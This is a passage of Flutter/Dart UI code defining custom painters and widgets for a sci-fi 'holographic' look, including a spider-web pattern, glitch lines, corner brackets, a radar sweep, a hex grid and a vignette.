  // ══════════════════════════════════════════════════════════════════════════
  // HELPERS
  // ══════════════════════════════════════════════════════════════════════════
  Widget _corner(Color c, double size, double w, {bool topLeft=false, bool topRight=false, bool bottomLeft=false, bool bottomRight=false}) {
    return SizedBox(
      width: size, height: size,
      child: CustomPaint(painter: _CornerPainter(c, w, topLeft: topLeft, topRight: topRight, bottomLeft: bottomLeft, bottomRight: bottomRight)),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// PAINTERS
// ═══════════════════════════════════════════════════════════════════════════
class _SpiderWebPainter extends CustomPainter {
  final double progress;
  final Color color;
  final double opacity;
  _SpiderWebPainter({required this.progress, required this.color, required this.opacity});

  @override
  void paint(Canvas canvas, Size size) {
    final cx = size.width / 2;
    final cy = size.height / 2;
    final paint = Paint()
      ..color = color.withOpacity(opacity)
      ..style = PaintingStyle.stroke
      ..strokeWidth = 0.8;

    const radialCount = 8;
    for (int i = 0; i < radialCount; i++) {
      final angle = (i / radialCount) * 2 * math.pi;
      final endX = cx + math.cos(angle) * size.width * 0.6;
      final endY = cy + math.sin(angle) * size.height * 0.7;
      canvas.drawLine(Offset(cx, cy), Offset(endX, endY), paint);
    }

    const ringCount = 3;
    for (int r = 1; r <= ringCount; r++) {
      final radius = (r / ringCount) * size.width * 0.45;
      final path = Path();
      for (int i = 0; i <= radialCount; i++) {
        final idx = i % radialCount;
        final angle = (idx / radialCount) * 2 * math.pi + (progress * 0.5);
        final nextAngle = ((idx + 1) % radialCount) / radialCount * 2 * math.pi + (progress * 0.5);
        final midAngle = (angle + nextAngle) / 2;
        final midRadius = radius * 0.85;
        final px = cx + math.cos(angle) * radius;
        final py = cy + math.sin(angle) * radius;
        if (i == 0) {
          path.moveTo(px, py);
        } else {
          final mx = cx + math.cos(midAngle) * midRadius;
          final my = cy + math.sin(midAngle) * midRadius;
          path.quadraticBezierTo(mx, my, px, py);
        }
      }
      canvas.drawPath(path, paint);
    }
  }

  @override
  bool shouldRepaint(_SpiderWebPainter o) => o.progress != progress || o.color != color;
}

class _GlitchPainter extends CustomPainter {
  final double progress;
  final Color color;
  _GlitchPainter({required this.progress, required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    final rng = math.Random((progress * 1000).floor());
    final linePaint = Paint()..strokeWidth = 1;

    for (int i = 0; i < 2; i++) {
      if (rng.nextDouble() > 0.7) {
        final y = rng.nextDouble() * size.height;
        final x1 = rng.nextDouble() * size.width;
        final w = rng.nextDouble() * size.width * 0.3;
        linePaint.color = (rng.nextBool() ? color : _C.goldBright).withOpacity(0.2);
        canvas.drawLine(Offset(x1, y), Offset(x1 + w, y), linePaint);
      }
    }
  }

  @override
  bool shouldRepaint(_GlitchPainter o) => o.progress != progress;
}

class _CornerPainter extends CustomPainter {
  final Color color;
  final double width;
  final bool topLeft, topRight, bottomLeft, bottomRight;
  _CornerPainter(this.color, this.width, {this.topLeft=false, this.topRight=false, this.bottomLeft=false, this.bottomRight=false});

  @override
  void paint(Canvas canvas, Size size) {
    final p = Paint()
      ..color = color
      ..strokeWidth = width
      ..style = PaintingStyle.stroke
      ..strokeCap = StrokeCap.round;

    const len = 0.5;
    if (topLeft) {
      canvas.drawLine(Offset.zero, Offset(size.width*len, 0), p);
      canvas.drawLine(Offset.zero, Offset(0, size.height*len), p);
    }
    if (topRight) {
      canvas.drawLine(Offset(size.width, 0), Offset(size.width*(1-len), 0), p);
      canvas.drawLine(Offset(size.width, 0), Offset(size.width, size.height*len), p);
    }
    if (bottomLeft) {
      canvas.drawLine(Offset(0, size.height), Offset(size.width*len, size.height), p);
      canvas.drawLine(Offset(0, size.height), Offset(0, size.height*(1-len)), p);
    }
    if (bottomRight) {
      canvas.drawLine(Offset(size.width, size.height), Offset(size.width*(1-len), size.height), p);
      canvas.drawLine(Offset(size.width, size.height), Offset(size.width, size.height*(1-len)), p);
    }
  }

  @override
  bool shouldRepaint(_CornerPainter o) => o.color != color;
}

class _HoloFrame extends StatelessWidget {
  final Widget child;
  final Color color;
  const _HoloFrame({required this.child, required this.color});

  @override
  Widget build(BuildContext context) => Container(
    decoration: BoxDecoration(
      borderRadius: BorderRadius.circular(16),
      color: Colors.black.withOpacity(0.4),
      gradient: LinearGradient(
        colors: [_C.card.withOpacity(0.6), _C.bgDeep.withOpacity(0.4)],
        begin: Alignment.topLeft,
        end: Alignment.bottomRight,
      ),
      border: Border.all(color: color.withOpacity(0.6), width: 1.5),
      boxShadow: [
        BoxShadow(color: color.withOpacity(0.3), blurRadius: 24, spreadRadius: 1),
        BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 12, offset: const Offset(0, 6)),
      ],
    ),
    child: Stack(children: [
      child,
      Positioned(top: 4, left: 4, child: _c(color, 12, 1.5, topLeft: true)),
      Positioned(top: 4, right: 4, child: _c(color, 12, 1.5, topRight: true)),
      Positioned(bottom: 4, left: 4, child: _c(color, 12, 1.5, bottomLeft: true)),
      Positioned(bottom: 4, right: 4, child: _c(color, 12, 1.5, bottomRight: true)),
    ]),
  );

  Widget _c(Color c, double s, double w, {bool topLeft=false, bool topRight=false, bool bottomLeft=false, bool bottomRight=false}) =>
    SizedBox(width: s, height: s,
      child: CustomPaint(painter: _CornerPainter(c, w, topLeft: topLeft, topRight: topRight, bottomLeft: bottomLeft, bottomRight: bottomRight)));
}

class _HoloBgPainter extends CustomPainter {
  final double t;
  final double disco;
  final double glitch;
  _HoloBgPainter(this.t, this.disco, this.glitch);

  @override
  void paint(Canvas canvas, Size size) {
    final angle = t * 2 * math.pi;

    final cxRadar = size.width / 2;
    final cyRadar = size.height * 0.3;
    final radarPaint = Paint()
      ..color = _C.goldBright.withOpacity(0.08)
      ..style = PaintingStyle.stroke
      ..strokeWidth = 0.8;
    for (double r = 60; r < size.width; r += 60) {
      canvas.drawCircle(Offset(cxRadar, cyRadar), r, radarPaint);
    }

    final sweepPaint = Paint()
      ..shader = SweepGradient(
        colors: [
          _C.crimsonUp.withOpacity(0.0),
          _C.crimsonUp.withOpacity(0.15),
          _C.crimsonUp.withOpacity(0.0),
        ],
        stops: const [0.0, 0.5, 1.0],
        transform: GradientRotation(angle),
      ).createShader(Rect.fromCircle(center: Offset(cxRadar, cyRadar), radius: 320));
    canvas.drawCircle(Offset(cxRadar, cyRadar), 320, sweepPaint);

    final hexPaint = Paint()
      ..color = _C.gold.withOpacity(0.05)
      ..style = PaintingStyle.stroke
      ..strokeWidth = 0.6;

    const hexSize = 30.0;
    final hexH = hexSize * math.sqrt(3);
    for (double y = 0; y < size.height + hexH; y += hexH * 0.5) {
      for (double x = 0; x < size.width + hexSize * 2; x += hexSize * 1.5) {
        final offsetX = (y / (hexH * 0.5)).round().isEven ? 0.0 : hexSize * 0.75;
        final path = Path();
        for (int i = 0; i < 6; i++) {
          final a2 = math.pi / 180 * (60 * i - 30);
          final px = x + offsetX + hexSize * math.cos(a2);
          final py = y + hexSize * math.sin(a2);
          if (i == 0) {
            path.moveTo(px, py);
          } else {
            path.lineTo(px, py);
          }
        }
        path.close();
        canvas.drawPath(path, hexPaint);
      }
    }

    final scanPaint = Paint()
      ..color = _C.crimson.withOpacity(0.03)
      ..strokeWidth = 1;
    for (double y = 0; y < size.height; y += 3) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), scanPaint);
    }

    final vignette = Paint()
      ..shader = RadialGradient(
        colors: [
          Colors.transparent,
          Colors.transparent,
          Colors.black.withOpacity(0.65),
          Colors.black.withOpacity(0.92),
        ],
        stops: const [0.0, 0.55, 0.85, 1.0],
        radius: 0.88,
      ).createShader(Rect.fromLTWH(0, 0, size.width, size.height));
    canvas.drawRect(Rect.fromLTWH(0, 0, size.width, size.height), vignette);
  }

  @override
  bool shouldRepaint(_HoloBgPainter o) => o.t != t || o.disco != disco || o.glitch != glitch;
}